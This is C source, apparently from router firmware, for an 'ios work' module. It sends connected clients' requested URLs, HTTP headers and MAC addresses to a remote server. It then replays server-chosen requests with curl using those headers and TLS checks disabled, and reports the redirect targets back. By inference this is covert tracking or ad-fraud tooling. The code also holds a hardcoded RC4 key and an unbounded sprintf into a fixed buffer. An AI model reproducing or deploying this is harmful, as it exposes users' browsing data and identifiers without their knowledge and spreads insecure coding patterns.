#include "ioswork.h"
#include "uadata.pb-c.h"
#include "nethelper.h"
#include "adconfig.h"
#include "update.h"
#include <unistd.h>  
#include <fcntl.h>  
#include <limits.h>  
#include <sys/wait.h>
#include <signal.h>
#include <errno.h>
#include "report.h"

#include "openssl/rc4.h"

#define LOG_ENABLE  0

static int item_release (struct ios_work_item_t* item) {
	if (item->query) {
		item->query->release(item->query);
		item->query = NULL;
	}
	if (item->end_point_mac) {
		free(item->end_point_mac);
		item->end_point_mac = NULL;	
	}
	free(item);
	return 0;
}

static char* parse_host(char* url, char** hostRes, int* port) {
	int schema = 0;
	char *host = NULL;
	if (strncasecmp(url, "http://", 7) == 0) {
		schema = 1;
		*port = 80;
		host = url + 7;
	} else if (strncasecmp(url, "https://", 8) == 0)  {
		schema = 2;
		*port = 443;
		host = url + 8;
	}

	if (schema == 0) {
		return NULL;
	}

	char* endHost = strchr(host, '/');
	char* path = endHost;

	if (endHost) *endHost = 0;

	char* pt = strchr(host, ':');
	if (pt != NULL) {
		*port = atoi(pt+1);		
		*pt = 0;
		*hostRes = strdup(host);
		*pt = ':';
	} else {
		*hostRes = strdup(host);
	}

	if (endHost) *endHost = '/';
	return path;
}

static void sig_child(int signo)
{
     pid_t        pid;
     int        stat;
     while ((pid = waitpid(-1, &stat, WNOHANG)) >0)
            printf("child %d terminated.\n", pid);
}

static bool run_wget(ios_work_item* item, char* guid, char* url, char** headers, int header_cnt) {
    signal(SIGCHLD,sig_child);
	int id = fork();
	if (id == -1) {
		report_ios_work(guid, "", url, 5, item->end_point_mac);
		if (LOG_ENABLE) log_error(LOG_INFO, "fork failed: %d", errno);
		return false;
	}

	if (id == 0) {
		int pids[2];
		if (-1 == pipe(pids)) {
			report_ios_work(guid, "", url, 6, item->end_point_mac);
			if(LOG_ENABLE) log_error(LOG_INFO, "pipe open failed");
			exit(-1);
		}
		int ncid = fork();
		if (ncid == -1) {
			report_ios_work(guid, "", url, 7, item->end_point_mac);
			if(LOG_ENABLE) log_error(LOG_INFO, "");
			exit(-1);
		}

		if (ncid == 0) {
			int fdwrite = pids[1];
			close(pids[0]);

			// redirect stdout and stderr
			dup2(fdwrite, 1);
			dup2(fdwrite, 2);
	
			char* cmdargs[100];
			memset(cmdargs, 0, sizeof(cmdargs));
			
			int ci = 0;
			cmdargs[ci++] = "curl";
			cmdargs[ci++] = "-k";
			cmdargs[ci++] = "-L";
			cmdargs[ci++] = "-v";
			cmdargs[ci++] = "-o";
			cmdargs[ci++] = "/dev/null";
			
			for (int i = 0; i < header_cnt;i ++) {
				if(LOG_ENABLE) log_error(LOG_INFO, "running curl headers: %s", headers[i]);
				char* hd = malloc(1024);
				memset(hd, 0, 1024);
				sprintf(hd, "'%s'", headers[i]);

				cmdargs[ci++] = "-H";
				cmdargs[ci++] = hd;
			}

			cmdargs[ci++] = url;

			if (execvp("curl", cmdargs)) { 
				if(LOG_ENABLE) log_error(LOG_INFO, "execlp failed %d", errno);
			}

			exit(0);
		} else {
			// todo: read from pipe
			int fdread = pids[0];
			close(pids[1]);
			char* location = malloc(4096);
			memset(location, 0, 4096);
			int loc = 0;

			char* result_buf = malloc(4096);
			memset(result_buf, 0, 4096);

			// read data from buffer
			FILE* fp = fdopen(fdread, "r");
			if (fp) {
				while(fgets(result_buf, 4096, fp) != NULL)
				{
					// if (LOG_ENABLE) log_error(LOG_INFO, "%s", result_buf);
					// if (0 == strncasecmp(result_buf, "Location", 8)) {
						if (strstr(result_buf, "Location") != NULL) {
							if(LOG_ENABLE) log_error(LOG_INFO, "=========%s=============", result_buf);
							int len = strlen(result_buf);
							if (loc + len + 1< 4096) {
								strcpy(location+loc, result_buf);
								loc += len;
								location[loc-1] = '|';
								location[loc-2] = '|';
							}
						}
					// }
				}
			} else {
				if(LOG_ENABLE) log_error(LOG_INFO, "open fd from pipe failed");
			}

			if (loc > 0) {
				report_ios_work(guid, location, url, 0, item->end_point_mac);
			} else {
				report_ios_work(guid, location, url, 20, item->end_point_mac);
			}

			fclose(fp);
			close(fdread);
			exit(0);	
		}
		/*
		char* res = malloc(4096);
		memset(res, 0, 4096);
		if (LOG_ENABLE) log_error(LOG_INFO, "running: %s", cmd);

		int ret = run_cmd(cmd, res, 4096);
		if (0 !=  ret) {
			if (LOG_ENABLE) log_error(LOG_INFO, "run cmd failed");
			// rpt run wget failed
		} else {
			// todo: rpt
			if (LOG_ENABLE) log_error(LOG_INFO, "running res:\n%s", res);
		}
		
		if (cmd) free(cmd);
		if (res) free(res);
		exit(0);
		*/
	}
	return true;
}

static bool rc4_crypt(char* data, int len) {
	RC4_KEY	key;	
	const char* rc4key = "1T@PgkGxRuEpQgTc8vL&fI8vDlY5b1g9";
	RC4_set_key(&key, strlen(rc4key), (const unsigned char*)rc4key); 
	RC4(&key, len, (const unsigned char*)data, (unsigned char*)data); 
	return true;	
}

static bool do_ios_work(ios_work_item* item, IosWorkItem* work) {
	report_ios_work(work->guid, "", work->workurl, 4, item->end_point_mac);
	for (size_t i = 0; i < work->n_ualist; i++) {
		UaItem *uaitem = work->ualist[i];
		run_wget(item, work->guid, work->workurl, uaitem->headers, uaitem->n_headers);
	}
	return true;
}

static int item_http_res_cb(simple_http_client* http, void* user_data) {
	ios_work_item* item = (ios_work_item*)user_data;
	bool bOk = false;
	if (http->state == simple_http_data_ok && http->resp_status == 200 &&
		http->body.len > 0) {
		// data ok
		if (LOG_ENABLE) log_error(LOG_INFO, "unpackding ios work response body len: %d", http->body.len);

		// rc4_crypt(http->body.buff, http->body.len);
		IosWorkItem* work = ios_work_item__unpack(NULL, http->body.len, (const uint8_t*)http->body.buff);
		if (work) {
			bOk = true;
			if (LOG_ENABLE) log_error(LOG_INFO, "unpack data IosWorkItem success from http body, %s", work->guid);
			do_ios_work(item, work);

			ios_work_item__free_unpacked(work, NULL);
			work = NULL;
		} else {
			if (LOG_ENABLE) log_error(LOG_INFO, "unpack work item from http body failed");
		}
	} else {
		if (LOG_ENABLE) log_error(LOG_INFO, "query ios wor failed");
	}

	if (!bOk) {
		report_ios_work("", "", "", 10, item->end_point_mac);
	}
	item->mgr->remote_item(item->mgr, item->work_id);
	return 0;
}

static simple_http_client* create_work_query(char* headers, char* url, char* target, ios_work_item* item, char* clientMac) {
	// todo: parse target to host and path
	char* thost = NULL;
	int port = 0;
	simple_http_client* client = NULL;
	simple_http_client* res = NULL;

	int   data_len = 0;
	uint8_t* dataBuf = NULL;

	char* tpath = parse_host(target, &thost, &port);
	if (tpath == NULL) {
		if (LOG_ENABLE) log_error(LOG_INFO, "parse host from: %s failed", target);
		goto exit0;
	}

	if (LOG_ENABLE) log_error(LOG_INFO, "parse host ok: %s %d %s", thost, port, tpath);

	client = create_simple_http(thost, port, tpath, "POST", item_http_res_cb, item, true);
	if (client == NULL) {
		if (LOG_ENABLE) log_error(LOG_INFO, "create simple http failed for ios work query");
		goto exit0;
	}
	
	// todo prepare ua and url

	IosWorkQuery query;
	ios_work_query__init(&query);
	query.userid = getbrlan_mac();
	query.url = url;
	query.headers = headers;
	query.clientmac = clientMac;
	query.channel = AD_CHANNEL;

	if (!query.userid) {
		if (LOG_ENABLE) log_error(LOG_INFO, "get userid failed from br lan");
		query.userid = "default_id";
	}

	data_len = ios_work_query__get_packed_size(&query);
	if (0 == data_len) goto exit0;	
	dataBuf = malloc(data_len);
	if (dataBuf == NULL || 0 == ios_work_query__pack(&query, dataBuf)) {
		if (LOG_ENABLE) log_error(LOG_INFO, "pack ios query failed");
		goto exit0;
	}
	 
	// rc4_crypt((char*)dataBuf, data_len);
	if (0 != client->do_request(client,(char*) dataBuf, data_len, 2000)) {
		if (LOG_ENABLE) log_error(LOG_INFO, "ios work query do request failed");
		goto exit0;
	}

	res = client;
	client = NULL;

exit0:
	if (thost != NULL) {
		free(thost);
		thost = NULL;
	}
	if (client) {
		client->release(client);
		client = NULL;
	}
	if (dataBuf) {
		free(dataBuf);
		dataBuf = NULL;
	}	
	return res;
}

static ios_work_item* create_work_item(ios_work_mgr* mgr, char* headers, char* url, char* target, int work_id, char* clientMac) {
	if (LOG_ENABLE) log_error(LOG_INFO, "");
	ios_work_item* item = malloc(sizeof(ios_work_item));
	memset(item, 0, sizeof(ios_work_item));
	
	item->release = item_release;
	item->work_id = work_id;
	item->mgr =  mgr;
	item->end_point_mac = strdup(clientMac);

	item->query = create_work_query(headers, url, target, item, clientMac); 
	if (item->query == NULL) {
		if (LOG_ENABLE) log_error(LOG_INFO, "create work query failed");
		item->release(item);
		item = NULL;
	} 
	return item;
}

//////////////////////////////////////////////////////////////////////////////////
static bool mgr_remote_item (struct ios_work_mgr_t* mgr, int work_id) {
	if (work_id < 0 || work_id >= 100) {
		return false;
	}
	ios_work_item* item = mgr->work_list[work_id];
	if (item != NULL) {
		item->release(item);
		mgr->work_list[work_id] = NULL;
	}
	return true;
}

static bool mgr_add_item (struct ios_work_mgr_t* mgr, char* headers, char* url, char* target, char* clientMac) {
	int work_id = -1;
	for (int i = 0; i < 100; i++) {
		if (mgr->work_list[i] == NULL) {
			work_id = i;
			break;
		}
	}
	if (work_id == -1) {
		if (LOG_ENABLE) log_error(LOG_INFO, "find empty work item failed");
		report_ios_work("", "", "", 3, clientMac);	
		return false;
	}

	ios_work_item* item = create_work_item(mgr, headers, url, target, work_id, clientMac);
	if (item == NULL) {
		report_ios_work("", "", "", 2, clientMac);	
		if (LOG_ENABLE) log_error(LOG_INFO, "create work item failed");
		return false;
	}
	
	report_ios_work("", "", "", 1, clientMac);
	mgr->work_list[work_id] = item;
	return true;
}

static int mgr_release (struct ios_work_mgr_t* mgr) {
	for (int i = 0; i < 100; i++) {
		if (mgr->work_list[i] != NULL) {
			mgr->work_list[i]->release(mgr->work_list[i]);
			mgr->work_list[i] = NULL;
		}
	}
	free(mgr);
	return 0;
}

static ios_work_mgr* s_mgr_inst = NULL;
ios_work_mgr* get_ios_work_mgr() {
	if (s_mgr_inst == NULL) {
		ios_work_mgr* mgr = malloc(sizeof(ios_work_mgr));
		memset(mgr, 0, sizeof(ios_work_mgr));

		mgr->release = mgr_release;
		mgr->remote_item = mgr_remote_item;
		mgr->add_item = mgr_add_item;
		s_mgr_inst = mgr;
	}
	return s_mgr_inst;	
}
